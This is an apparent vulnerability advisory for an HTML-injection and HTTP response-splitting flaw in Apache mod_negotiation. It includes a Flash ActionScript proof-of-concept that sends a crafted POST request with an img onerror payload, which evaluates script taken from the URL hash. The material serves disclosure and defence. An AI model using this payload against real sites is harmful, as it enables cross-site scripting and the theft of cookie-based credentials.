source: http://www.securityfocus.com/bid/27409/info

Apache 'mod_negotiation' is prone to an HTML-injection and an HTTP response-splitting vulnerability because the application fails to properly sanitize user-supplied input before using it in dynamically generated content.

Attacker-supplied HTML or JavaScript code could run in the context of the affected site, potentially allowing an attacker to steal cookie-based authentication credentials, control how the site is rendered to the user, and influence or misrepresent how web content is served, cached, or interpreted; other attacks are also possible. 

// Tested on IE 7 and FF 2.0.11, Flash plugin 9.0 r115
// Compile with flex compiler
package
{
  import flash.display.Sprite;
  import flash.net.*
  public class TestXss extends flash.display.Sprite {
    public function TestXss(){
      var r:URLRequest = new URLRequest('http://victim/<img%20src=sa%20
                  onerror=eval(document.location.hash.substr(1))>#alert(123)');

      r.method = 'POST';
      r.data = unescape('test');
      r.requestHeaders.push(new URLRequestHeader('Accept', 'image/jpeg; q=0'));

      navigateToURL(r, '_self');
     
    }
    }
}